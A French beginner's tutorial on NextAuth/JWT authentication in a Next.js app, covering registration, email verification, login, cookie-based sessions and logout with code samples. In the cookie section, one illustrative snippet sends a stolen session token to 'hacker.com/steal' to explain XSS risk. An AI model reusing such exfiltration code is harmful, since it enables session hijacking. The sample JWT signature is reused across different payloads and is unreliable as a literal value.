# Comprendre l'Authentification - Guide Pédagogique

Ce document explique **DE MANIÈRE SIMPLE** comment fonctionne l'authentification, comme si vous étiez débutant. Vous allez comprendre **concrètement** ce qui se passe à chaque étape.

---

## L'Objectif

**Créer un système où :**
1. L'utilisateur s'inscrit
2. L'utilisateur se connecte
3. Le serveur "se souvient" qu'il est connecté
4. L'utilisateur peut accéder aux pages protégées
5. L'utilisateur peut se déconnecter

---

## Analogie : Le Badge d'Entreprise

Imaginez une entreprise avec un système de sécurité :

### Sans Authentification

```
Vous : "Bonjour, je veux entrer"
Gardien : "OK, entrez"
[X] Problème : N'importe qui peut entrer !
```

### Avec Authentification (Mauvaise Approche)

```
Vous : "Bonjour, je veux entrer"
Gardien : "Quel est votre nom et mot de passe ?"
Vous : "John, password123"
Gardien : *Vérifie dans son registre*
Gardien : "OK, entrez"

--- 5 minutes plus tard, même porte ---

Vous : "Bonjour, je veux entrer"
Gardien : "Quel est votre nom et mot de passe ?"
Vous : "John, password123"
Gardien : *Vérifie à nouveau dans son registre*
[X] Problème : Vous devez vous identifier à CHAQUE fois !
```

### Avec JWT (Bonne Approche)

```
[PREMIÈRE FOIS - Connexion]
Vous : "Bonjour, je veux entrer"
Gardien : "Quel est votre nom et mot de passe ?"
Vous : "John, password123"
Gardien : *Vérifie dans son registre*
Gardien : "OK, voici votre BADGE. Il est valide 30 jours."
         [BADGE avec votre photo, nom, rôle, expiration]

[TOUTES LES FOIS SUIVANTES]
Vous : "Bonjour, je veux entrer"
Gardien : *Regarde votre badge*
Gardien : "Badge valide, entrez !"
[OK] Pas besoin de vérifier le registre à chaque fois !

[DÉCONNEXION]
Vous : "Je pars, reprenez mon badge"
Gardien : *Détruit le badge*
```

**Le JWT = Le Badge**

---

## Les Concepts Clés

### 1. Access Token vs Refresh Token

Dans Next Match, on utilise **UNIQUEMENT un Access Token (JWT)**.

**Comparaison :**

| Type | Durée | Stockage | Usage |
|------|-------|----------|-------|
| **Access Token** | Court (15 min - 30 jours) | Cookie | Accès aux ressources |
| **Refresh Token** | Long (30 jours - 1 an) | Cookie HttpOnly sécurisé | Renouveler l'access token |

**Next Match utilise :**
- [OUI] Un JWT (Access Token) avec durée longue (30 jours)
- [NON] Pas de Refresh Token

**Pourquoi ?**
- Simple à implémenter
- Suffisant pour une app web (pas mobile)
- NextAuth gère automatiquement

---

### 2. JWT : C'est Quoi Concrètement ?

**JWT = JSON Web Token**

C'est un **texte** en 3 parties séparées par des points `.`

#### Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│                                    │                                                                                          │
│         HEADER (Base64)            │                       PAYLOAD (Base64)                                                    │    SIGNATURE
```

#### Décomposé

**1️⃣ HEADER (En-tête)**

```json
{
  "alg": "HS256",  // Algorithme de signature (HMAC SHA256)
  "typ": "JWT"     // Type : JWT
}
```

**2️⃣ PAYLOAD (Données)**

```json
{
  "sub": "clw9k2x0a0000qw8r1g2h3j4k",  // Subject (ID utilisateur)
  "email": "john@example.com",
  "name": "John Doe",
  "profileComplete": true,
  "role": "MEMBER",
  "iat": 1697000000,  // Issued At (timestamp création)
  "exp": 1699678400   // Expiration (timestamp)
}
```

**3️⃣ SIGNATURE (Sécurité)**

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  NEXTAUTH_SECRET  // 🔐 Clé secrète (dans .env)
)
```

**Résultat : `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`**

---

#### Pourquoi C'est Sécurisé ?

```
[Scenario 1 : Hacker essaie de modifier le JWT]

JWT original :
eyJhbGci...  .  eyJzdWIi... (role: "MEMBER")  .  SflKxwR...

Hacker modifie le payload :
eyJhbGci...  .  eyJzdWIi... (role: "ADMIN" !!!)  .  SflKxwR...

Serveur vérifie la signature :
HMACSHA256(header + payload, NEXTAUTH_SECRET) === signature ?
[X] FALSE ! Signature ne correspond pas au nouveau payload

Serveur : "Token invalide, accès refusé !"
```

**Sans la clé secrète `NEXTAUTH_SECRET`, impossible de créer une signature valide.**

---

### 3. Cookie HTTP-Only : Le Coffre-Fort

**Le JWT est stocké dans un cookie spécial.**

#### Différence Cookie Normal vs HTTP-Only

**Cookie Normal (Dangereux)**

```javascript
// JavaScript peut lire le token
document.cookie = "token=eyJhbGci...";

// Un script malveillant peut voler le token
const token = document.cookie; // [X] Accessible !
fetch('https://hacker.com/steal', { 
  method: 'POST', 
  body: token 
});
```

**Cookie HTTP-Only (Sécurisé)**

```javascript
// Créé par le serveur avec flag HttpOnly
Set-Cookie: next-auth.session-token=eyJhbGci...; HttpOnly; Secure; SameSite=Lax

// JavaScript NE PEUT PAS le lire
console.log(document.cookie); // [X] Token invisible !

// Le browser l'envoie AUTOMATIQUEMENT
fetch('/api/members'); // [OK] Cookie envoyé automatiquement
```

**Avantages :**
- [OK] Pas accessible par JavaScript (protection XSS)
- [OK] Envoyé automatiquement à chaque requête
- [OK] Secure = HTTPS seulement en production
- [OK] SameSite = Protection CSRF

---

## Les Étapes Concrètes

### Scénario Complet : Inscription → Connexion → Utilisation

---

### **ÉTAPE 1 : Inscription (Register)**

#### Ce que l'utilisateur voit

```
┌─────────────────────────────────┐
│  Formulaire d'inscription       │
├─────────────────────────────────┤
│  Name:     [John Doe        ]   │
│  Email:    [john@example.com]   │
│  Password: [••••••••••••]       │
│  Gender:   [Male ▼]             │
│  Date:     [1995-06-15]         │
│  City:     [Paris]              │
│  Country:  [France]             │
│                                 │
│  [     SUBMIT     ]             │
└─────────────────────────────────┘
```

#### Ce qui se passe derrière

```typescript
// [1] CLIENT : Collecte les données
const formData = {
  name: "John Doe",
  email: "john@example.com",
  password: "password123",
  gender: "male",
  dateOfBirth: "1995-06-15",
  city: "Paris",
  country: "France",
  description: "Hello!"
};

// [2] CLIENT : Appel Server Action
const result = await registerUser(formData);
```

```typescript
// [3] SERVEUR : Server Action
export async function registerUser(data: RegisterSchema) {
  
  // A. Validation des données
  const validated = combinedRegisterSchema.safeParse(data);
  // Vérifie : email valide, password >= 6 chars, age >= 18
  
  // B. Hash du password
  const hashedPassword = await bcrypt.hash(data.password, 10);
  
  // Input:  "password123"
  // Output: "$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
  
  // C. Vérification email unique
  const existingUser = await prisma.user.findUnique({
    where: { email: data.email }
  });
  
  if (existingUser) {
    return { status: 'error', error: 'User already exists' };
  }
  
  // D. Création dans la base de données
  const user = await prisma.user.create({
    data: {
      name: data.name,
      email: data.email,
      passwordHash: hashedPassword,  // ⚠️ Jamais le password en clair !
      profileComplete: true,
      role: 'MEMBER',
      
      // Création du profil en même temps (nested create)
      member: {
        create: {
          name: data.name,
          gender: data.gender,
          dateOfBirth: new Date(data.dateOfBirth),
          city: data.city,
          country: data.country,
          description: data.description
        }
      }
    }
  });
  
  // E. Génération token de vérification email
  const token = generateRandomToken(48); // 96 caractères hex
  await prisma.token.create({
    data: {
      email: data.email,
      token: token,
      expires: new Date(Date.now() + 24 * 60 * 60 * 1000), // 24h
      type: 'VERIFICATION'
    }
  });
  
  // F. Envoi email
  await sendVerificationEmail(data.email, token);
  
  // G. Retour
  return { status: 'success', data: user };
}
```

#### Dans la Base de Données

```sql
-- Table User
INSERT INTO "User" (
  id, 
  name, 
  email, 
  "passwordHash", 
  "emailVerified", 
  "profileComplete", 
  role
) VALUES (
  'clw9k2x0a0000qw8r1g2h3j4k',
  'John Doe',
  'john@example.com',
  '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy',
  NULL,  -- Pas encore vérifié
  true,
  'MEMBER'
);

-- Table Member
INSERT INTO "Member" (
  id,
  "userId",
  name,
  gender,
  "dateOfBirth",
  city,
  country,
  description
) VALUES (
  'clw9k2x0a0001qw8r5m6n7o8p',
  'clw9k2x0a0000qw8r1g2h3j4k',
  'John Doe',
  'male',
  '1995-06-15',
  'Paris',
  'France',
  'Hello!'
);

-- Table Token
INSERT INTO "Token" (
  id,
  email,
  token,
  expires,
  type
) VALUES (
  'clw9k2x0a0002qw8r9p0q1r2s',
  'john@example.com',
  'a3f9e2c1b8d7f4a5c6e7d8b9a0f1e2d3c4b5a6e7d8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3',
  '2024-10-22 10:00:00',
  'VERIFICATION'
);
```

---

### **ÉTAPE 2 : Vérification Email**

#### Ce que l'utilisateur fait

```
Email reçu :
┌─────────────────────────────────────────┐
│  Subject: Verify your email address    │
├─────────────────────────────────────────┤
│  Hi John,                               │
│                                         │
│  Click the link to verify your email:  │
│                                         │
│  >> [Verify Email]                      │
│                                         │
│  Link expires in 24 hours.             │
└─────────────────────────────────────────┘

Utilisateur clique → Ouvre :
http://localhost:3000/verify-email?token=a3f9e2c1b8d7...
```

#### Ce qui se passe

```typescript
// Page /verify-email
export default async function VerifyEmailPage({ searchParams }) {
  const { token } = searchParams;
  
  // Appel Server Action
  const result = await verifyEmail(token);
  
  if (result.status === 'success') {
    return <div>[OK] Email vérifié ! <Link href="/login">Se connecter</Link></div>;
  }
  
  return <div>[ERREUR] {result.error}</div>;
}
```

```typescript
// Server Action
export async function verifyEmail(token: string) {
  
  // 1. Cherche le token dans la DB
  const tokenRecord = await prisma.token.findFirst({
    where: { token }
  });
  
  if (!tokenRecord) {
    return { status: 'error', error: 'Token invalide' };
  }
  
  // 2. Vérifie expiration
  if (new Date() > tokenRecord.expires) {
    return { status: 'error', error: 'Token expiré' };
  }
  
  // 3. Met à jour User.emailVerified
  await prisma.user.update({
    where: { email: tokenRecord.email },
    data: { emailVerified: new Date() }
  });
  
  // 4. Supprime le token (usage unique)
  await prisma.token.delete({
    where: { id: tokenRecord.id }
  });
  
  return { status: 'success', data: 'Success' };
}
```

```sql
-- Mise à jour
UPDATE "User" 
SET "emailVerified" = NOW() 
WHERE email = 'john@example.com';

-- Suppression token
DELETE FROM "Token" WHERE id = 'clw9k2x0a0002qw8r9p0q1r2s';
```

---

### **ÉTAPE 3 : Connexion (Login) - LA PLUS IMPORTANTE**

#### Ce que l'utilisateur voit

```
┌─────────────────────────────────┐
│  Login                          │
├─────────────────────────────────┤
│  Email:    [john@example.com]   │
│  Password: [••••••••••••]       │
│                                 │
│  [      LOGIN      ]            │
└─────────────────────────────────┘
```

#### Ce qui se passe (DÉTAIL COMPLET)

```typescript
// [1] CLIENT : Formulaire
const onSubmit = async (data: LoginSchema) => {
  const result = await signInUser(data);
  
  if (result.status === 'success') {
    router.push('/members');
  } else {
    toast.error(result.error);
  }
};
```

```typescript
// [2] SERVEUR : Server Action
export async function signInUser(data: LoginSchema) {
  
  // A. Cherche l'utilisateur
  const user = await prisma.user.findUnique({
    where: { email: data.email }
  });
  
  if (!user) {
    return { status: 'error', error: 'Invalid credentials' };
  }
  
  // B. Vérifie email vérifié
  if (!user.emailVerified) {
    return { 
      status: 'error', 
      error: 'Please verify your email' 
    };
  }
  
  // C. Vérifie password
  const isValidPassword = await bcrypt.compare(
    data.password,        // "password123"
    user.passwordHash     // "$2a$10$N9qo8uLOickgx2..."
  );
  
  if (!isValidPassword) {
    return { status: 'error', error: 'Invalid credentials' };
  }
  
  // D. Connexion via NextAuth
  const result = await signIn('credentials', {
    email: data.email,
    password: data.password,
    redirect: false
  });
  
  return { status: 'success', data: 'Logged in' };
}
```

```typescript
// [3] NEXTAUTH : Provider Credentials
export default {
  providers: [
    Credentials({
      async authorize(creds) {
        // Validation
        const validated = loginSchema.safeParse(creds);
        if (!validated.success) return null;
        
        const { email, password } = validated.data;
        
        // Récupère user
        const user = await getUserByEmail(email);
        
        // Vérifie password
        if (!user || !user.passwordHash) return null;
        
        const isValid = await compare(password, user.passwordHash);
        if (!isValid) return null;
        
        // RETOURNE L'OBJET USER
        return user;
        // user = {
        //   id: "clw9k2x0a0000qw8r1g2h3j4k",
        //   name: "John Doe",
        //   email: "john@example.com",
        //   profileComplete: true,
        //   role: "MEMBER"
        // }
      }
    })
  ]
}
```

```typescript
// [4] NEXTAUTH : Callback JWT
export const { auth, signIn } = NextAuth({
  callbacks: {
    
    // CRÉATION DU JWT
    async jwt({ user, token }) {
      if (user) {
        // Première connexion : user est défini
        token.profileComplete = user.profileComplete;
        token.role = user.role;
      }
      // token = {
      //   sub: "clw9k2x0a0000qw8r1g2h3j4k",  // user.id
      //   email: "john@example.com",
      //   name: "John Doe",
      //   profileComplete: true,
      //   role: "MEMBER",
      //   iat: 1697000000,  // timestamp maintenant
      //   exp: 1699678400   // timestamp + 30 jours
      // }
      return token;
    },
    
    async session({ token, session }) {
      // Transfert données token → session
      if (token.sub && session.user) {
        session.user.id = token.sub;
        session.user.profileComplete = token.profileComplete;
        session.user.role = token.role;
      }
      return session;
    }
  }
});
```

```typescript
// [5] NEXTAUTH : Signature du JWT
const jwt = {
  header: { alg: "HS256", typ: "JWT" },
  payload: {
    sub: "clw9k2x0a0000qw8r1g2h3j4k",
    email: "john@example.com",
    name: "John Doe",
    profileComplete: true,
    role: "MEMBER",
    iat: 1697000000,
    exp: 1699678400
  }
};

// Encodage Base64URL
const encodedHeader = base64UrlEncode(JSON.stringify(jwt.header));
const encodedPayload = base64UrlEncode(JSON.stringify(jwt.payload));

// Signature HMAC SHA256
const signature = HMACSHA256(
  encodedHeader + "." + encodedPayload,
  process.env.NEXTAUTH_SECRET  // 🔐 Clé secrète
);

// JWT final
const jwtString = `${encodedHeader}.${encodedPayload}.${signature}`;

// Résultat :
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbHc5azJ4MGEwMDAwcXc4cjFnMmgzajRrIiwiZW1haWwiOiJqb2huQGV4YW1wbGUuY29tIiwibmFtZSI6IkpvaG4gRG9lIiwicHJvZmlsZUNvbXBsZXRlIjp0cnVlLCJyb2xlIjoiTUVNQkVSIiwiaWF0IjoxNjk3MDAwMDAwLCJleHAiOjE2OTk2Nzg0MDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

```typescript
// [6] NEXTAUTH : Création du Cookie
res.setHeader('Set-Cookie', [
  `next-auth.session-token=${jwtString}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000`
  // Max-Age=2592000 = 30 jours (30 * 24 * 60 * 60)
]);
```

#### Dans le Browser (DevTools)

```
Application > Cookies > http://localhost:3000

Name:     next-auth.session-token
Value:    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbHc5azJ4MGEwMDA...
Domain:   localhost
Path:     /
Expires:  2024-11-20 10:00:00 (30 jours)
Size:     423 bytes
HttpOnly: [OUI]
Secure:   [OUI] (en production)
SameSite: Lax
```

---

### **ÉTAPE 4 : Utilisation (Requêtes Suivantes)**

#### Chaque fois que l'utilisateur navigue

```
Utilisateur clique : "Voir les membres"
```

```
[BROWSER]
│
├─ GET /members
│  Headers:
│  - Cookie: next-auth.session-token=eyJhbGci...
│
▼

[NEXT.JS SERVER - MIDDLEWARE]
│
├─ Lit le cookie
│  const cookie = req.cookies.get('next-auth.session-token')
│
├─ Décode le JWT
│  const token = decodeJWT(cookie)
│
├─ Vérifie la signature
│  const isValid = verifySignature(token, NEXTAUTH_SECRET)
│
├─ Vérifie l'expiration
│  if (token.exp < Date.now()) → Redirect /login
│
├─ Callback session({ token })
│  req.auth = {
│    user: {
│      id: token.sub,
│      email: token.email,
│      name: token.name,
│      profileComplete: token.profileComplete,
│      role: token.role
│    }
│  }
│
▼

[PAGE /members]
│
├─ const session = await auth()
│  // session disponible immédiatement (pas de query DB)
│
├─ Affiche la page avec les infos user
│
▼

[BROWSER]
└─ Page affichée
```

#### Code Middleware

```typescript
// src/middleware.ts
export default auth((req) => {
  // req.auth est AUTOMATIQUEMENT défini par NextAuth
  // En lisant et décodant le JWT depuis le cookie
  
  const isLoggedIn = !!req.auth;
  
  console.log({
    isLoggedIn,
    userId: req.auth?.user?.id,
    email: req.auth?.user?.email,
    role: req.auth?.user?.role
  });
  
  // Protection
  if (!isLoggedIn && !isPublicRoute) {
    return NextResponse.redirect(new URL('/login', req.url));
  }
  
  return NextResponse.next();
});
```

#### Code Page

```typescript
// src/app/members/page.tsx
import { auth } from '@/auth';

export default async function MembersPage() {
  
  // Lit le JWT depuis le cookie
  const session = await auth();
  
  // session = {
  //   user: {
  //     id: "clw9k2x0a0000qw8r1g2h3j4k",
  //     email: "john@example.com",
  //     name: "John Doe",
  //     profileComplete: true,
  //     role: "MEMBER"
  //   },
  //   expires: "2024-11-20T10:00:00.000Z"
  // }
  
  // [IMPORTANT] AUCUNE REQUÊTE EN BASE DE DONNÉES
  // Tout est dans le JWT !
  
  return (
    <div>
      <h1>Bienvenue {session.user.name}</h1>
      <p>Role: {session.user.role}</p>
    </div>
  );
}
```

---

### **ÉTAPE 5 : Déconnexion (Logout)**

```typescript
// Client Component
'use client';
import { signOut } from 'next-auth/react';

export default function LogoutButton() {
  const handleLogout = async () => {
    await signOut({ redirectTo: '/' });
  };
  
  return <button onClick={handleLogout}>Se déconnecter</button>;
}
```

#### Ce qui se passe

```
1. Utilisateur clique "Se déconnecter"

2. NextAuth envoie une réponse avec cookie expiré :
   Set-Cookie: next-auth.session-token=; Path=/; Max-Age=0

3. Browser supprime le cookie

4. Redirection vers "/"

5. Requêtes suivantes → Pas de cookie → req.auth = null → Redirect /login
```

---

## Comment Reproduire Ça ?

### Les Étapes pour Créer Votre Système

#### Étape 1 : Setup Base de Données (Prisma)

```bash
# Installation
npm install prisma @prisma/client

# Initialisation
npx prisma init
```

**Fichier `prisma/schema.prisma` :**

```prisma
datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

generator client {
  provider = "prisma-client-js"
}

model User {
  id              String    @id @default(cuid())
  email           String    @unique
  passwordHash    String?
  name            String?
  emailVerified   DateTime?
  profileComplete Boolean   @default(false)
  role            Role      @default(MEMBER)
  createdAt       DateTime  @default(now())
}

enum Role {
  MEMBER
  ADMIN
}
```

```bash
# Génère le client Prisma
npx prisma generate

# Crée la base de données
npx prisma db push
```

---

#### Étape 2 : Installation NextAuth

```bash
npm install next-auth@beta
npm install @auth/prisma-adapter
npm install bcryptjs
npm install @types/bcryptjs -D
```

---

#### Étape 3 : Configuration NextAuth

**Fichier `.env` :**

```env
DATABASE_URL="postgresql://user:password@localhost:5432/mydb"
NEXTAUTH_SECRET="votre-secret-long-aleatoire-genere-avec-openssl"
NEXTAUTH_URL="http://localhost:3000"
```

**Générer le secret :**

```bash
openssl rand -base64 32
```

---

**Fichier `src/auth.config.ts` :**

```typescript
import Credentials from "next-auth/providers/credentials"
import { compare } from 'bcryptjs'
import type { NextAuthConfig } from "next-auth"
import { prisma } from './lib/prisma'

export default {
  providers: [
    Credentials({
      async authorize(creds) {
        const { email, password } = creds as { email: string, password: string }
        
        // Cherche user
        const user = await prisma.user.findUnique({
          where: { email }
        })
        
        if (!user || !user.passwordHash) return null
        
        // Vérifie password
        const isValid = await compare(password, user.passwordHash)
        if (!isValid) return null
        
        // Retourne user
        return user
      }
    })
  ],
} satisfies NextAuthConfig
```

---

**Fichier `src/auth.ts` :**

```typescript
import NextAuth from "next-auth"
import { PrismaAdapter } from "@auth/prisma-adapter"
import authConfig from "./auth.config"
import { prisma } from './lib/prisma'

export const { handlers, auth, signIn, signOut } = NextAuth({
  adapter: PrismaAdapter(prisma),
  session: { strategy: "jwt" },
  
  callbacks: {
    async jwt({ user, token }) {
      if (user) {
        token.role = user.role
        token.profileComplete = user.profileComplete
      }
      return token
    },
    
    async session({ token, session }) {
      if (token.sub && session.user) {
        session.user.id = token.sub
        session.user.role = token.role
        session.user.profileComplete = token.profileComplete
      }
      return session
    }
  },
  
  ...authConfig,
})
```

---

**Fichier `src/app/api/auth/[...nextauth]/route.ts` :**

```typescript
import { handlers } from '@/auth'

export const { GET, POST } = handlers
```

---

#### Étape 4 : Middleware de Protection

**Fichier `src/middleware.ts` :**

```typescript
import { NextResponse } from 'next/server'
import { auth } from './auth'

export default auth((req) => {
  const isLoggedIn = !!req.auth
  const { pathname } = req.nextUrl
  
  // Routes publiques
  const publicRoutes = ['/', '/login', '/register']
  const isPublic = publicRoutes.includes(pathname)
  
  // Protection
  if (!isPublic && !isLoggedIn) {
    return NextResponse.redirect(new URL('/login', req.url))
  }
  
  return NextResponse.next()
})

export const config = {
  matcher: ['/((?!api|_next/static|_next/image|favicon.ico).*)']
}
```

---

#### Étape 5 : Server Actions

**Fichier `src/app/actions/authActions.ts` :**

```typescript
'use server'

import { signIn, signOut } from '@/auth'
import { prisma } from '@/lib/prisma'
import bcrypt from 'bcryptjs'

// Inscription
export async function registerUser(data: {
  email: string
  password: string
  name: string
}) {
  // Hash password
  const hashedPassword = await bcrypt.hash(data.password, 10)
  
  // Vérifie email unique
  const existing = await prisma.user.findUnique({
    where: { email: data.email }
  })
  
  if (existing) {
    return { status: 'error', error: 'User already exists' }
  }
  
  // Crée user
  const user = await prisma.user.create({
    data: {
      email: data.email,
      name: data.name,
      passwordHash: hashedPassword,
      emailVerified: new Date(), // Ou null si vérification email
      profileComplete: true
    }
  })
  
  return { status: 'success', data: user }
}

// Connexion
export async function signInUser(data: {
  email: string
  password: string
}) {
  try {
    await signIn('credentials', {
      email: data.email,
      password: data.password,
      redirect: false
    })
    
    return { status: 'success', data: 'Logged in' }
  } catch (error) {
    return { status: 'error', error: 'Invalid credentials' }
  }
}

// Déconnexion
export async function signOutUser() {
  await signOut({ redirectTo: '/' })
}
```

---

#### Étape 6 : Composants Client

**Fichier `src/app/login/page.tsx` :**

```typescript
'use client'

import { signInUser } from '@/app/actions/authActions'
import { useRouter } from 'next/navigation'
import { useState } from 'react'

export default function LoginPage() {
  const router = useRouter()
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    const result = await signInUser({ email, password })
    
    if (result.status === 'success') {
      router.push('/dashboard')
      router.refresh()
    } else {
      alert(result.error)
    }
  }
  
  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="Email"
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        placeholder="Password"
      />
      <button type="submit">Se connecter</button>
    </form>
  )
}
```

---

#### Étape 7 : Accès Session dans les Pages

**Server Component :**

```typescript
import { auth } from '@/auth'

export default async function DashboardPage() {
  const session = await auth()
  
  if (!session) {
    return <div>Non connecté</div>
  }
  
  return (
    <div>
      <h1>Bienvenue {session.user.name}</h1>
      <p>Email: {session.user.email}</p>
    </div>
  )
}
```

**Client Component :**

```typescript
'use client'

import { useSession } from 'next-auth/react'

export default function ProfileCard() {
  const { data: session, status } = useSession()
  
  if (status === 'loading') return <div>Chargement...</div>
  if (!session) return <div>Non connecté</div>
  
  return <div>Email: {session.user.email}</div>
}
```

---

## Schéma Récapitulatif

```mermaid
flowchart TD
    START([Utilisateur]) --> REGISTER{Déjà inscrit?}
    
    REGISTER -->|Non| R1[Formulaire inscription]
    R1 --> R2[Server Action: registerUser]
    R2 --> R3[Hash password avec bcrypt]
    R3 --> R4[INSERT User en DB]
    R4 --> R5[Génère token vérification]
    R5 --> R6[Envoi email]
    R6 --> R7[Utilisateur clique lien]
    R7 --> R8[UPDATE User.emailVerified]
    R8 --> LOGIN
    
    REGISTER -->|Oui| LOGIN[Page Login]
    
    LOGIN --> L1[Formulaire email + password]
    L1 --> L2[Server Action: signInUser]
    L2 --> L3{Credentials valides?}
    
    L3 -->|Non| L4[Erreur]
    L4 --> LOGIN
    
    L3 -->|Oui| L5[NextAuth Provider authorize]
    L5 --> L6[Callback jwt: Crée token]
    L6 --> L7[Génère JWT]
    L7 --> L8[Signature avec NEXTAUTH_SECRET]
    L8 --> L9[Cookie HTTP-Only créé]
    L9 --> L10[Redirection /dashboard]
    
    L10 --> USE[Navigation dans l'app]
    
    USE --> U1[Requête GET /page]
    U1 --> U2[Cookie JWT envoyé automatiquement]
    U2 --> U3[Middleware décode JWT]
    U3 --> U4{JWT valide?}
    
    U4 -->|Non| U5[Redirect /login]
    U5 --> LOGIN
    
    U4 -->|Oui| U6[req.auth défini]
    U6 --> U7[Page rendue avec session]
    U7 --> USE
    
    USE --> LOGOUT{Déconnexion?}
    LOGOUT -->|Non| USE
    LOGOUT -->|Oui| LO1[signOut]
    LO1 --> LO2[Cookie supprimé]
    LO2 --> LO3[Redirect /]
    LO3 --> START
    
    style START fill:#e3f2fd,stroke:#1976d2,stroke-width:4px,color:#000
    style L9 fill:#c8e6c9,stroke:#2e7d32,stroke-width:4px,color:#000
    style L7 fill:#fff9c4,stroke:#f57f17,stroke-width:3px,color:#000
    style U7 fill:#c8e6c9,stroke:#2e7d32,stroke-width:4px,color:#000
    style L4 fill:#ffcdd2,stroke:#c62828,stroke-width:3px,color:#000
    style U5 fill:#ffcdd2,stroke:#c62828,stroke-width:3px,color:#000
```

---

## Checklist Complète

### Pour Reproduire le Système

- [ ] **Base de données**
  - [ ] PostgreSQL installé ou cloud (Supabase/Neon)
  - [ ] Prisma installé et configuré
  - [ ] Schéma User créé
  - [ ] `npx prisma db push` exécuté

- [ ] **NextAuth**
  - [ ] `next-auth@beta` installé
  - [ ] `NEXTAUTH_SECRET` généré et dans `.env`
  - [ ] `NEXTAUTH_URL` configuré
  - [ ] `src/auth.config.ts` créé
  - [ ] `src/auth.ts` créé
  - [ ] Route API `[...nextauth]/route.ts` créée

- [ ] **Middleware**
  - [ ] `src/middleware.ts` créé
  - [ ] Routes publiques définies
  - [ ] Protection en place

- [ ] **Server Actions**
  - [ ] `registerUser()` créée
  - [ ] `signInUser()` créée
  - [ ] `signOutUser()` créée
  - [ ] bcrypt pour hash passwords

- [ ] **Pages**
  - [ ] Page `/register` avec formulaire
  - [ ] Page `/login` avec formulaire
  - [ ] Page protégée `/dashboard`
  - [ ] Bouton logout

- [ ] **Tests**
  - [ ] Inscription fonctionne
  - [ ] Connexion fonctionne
  - [ ] Cookie créé dans DevTools
  - [ ] Pages protégées redirigent si non connecté
  - [ ] Déconnexion fonctionne

---

## Points Clés à Retenir

1. **JWT = Badge numérique**
   - Contient les infos user
   - Signé avec secret
   - Valide 30 jours

2. **Cookie HTTP-Only = Coffre-fort**
   - Pas accessible par JavaScript
   - Envoyé automatiquement
   - Sécurisé

3. **Pas de Refresh Token**
   - Un seul JWT longue durée
   - Plus simple pour web app

4. **Stateless**
   - Pas de query DB pour vérifier session
   - Tout dans le JWT
   - Ultra rapide

5. **NextAuth Gère Tout**
   - Génération JWT
   - Gestion cookie
   - Callbacks
   - Middleware

---

## Ressources pour Approfondir

**Documentation :**
- NextAuth.js : https://authjs.dev/
- Prisma : https://www.prisma.io/docs
- JWT : https://jwt.io/introduction

**Comprendre JWT :**
- Décodeur JWT : https://jwt.io/
- Article JWT : https://auth0.com/docs/secure/tokens/json-web-tokens

**Sécurité :**
- OWASP Auth : https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- Cookie Flags : https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies

---

**Vous savez maintenant EXACTEMENT comment fonctionne l'authentification moderne !**

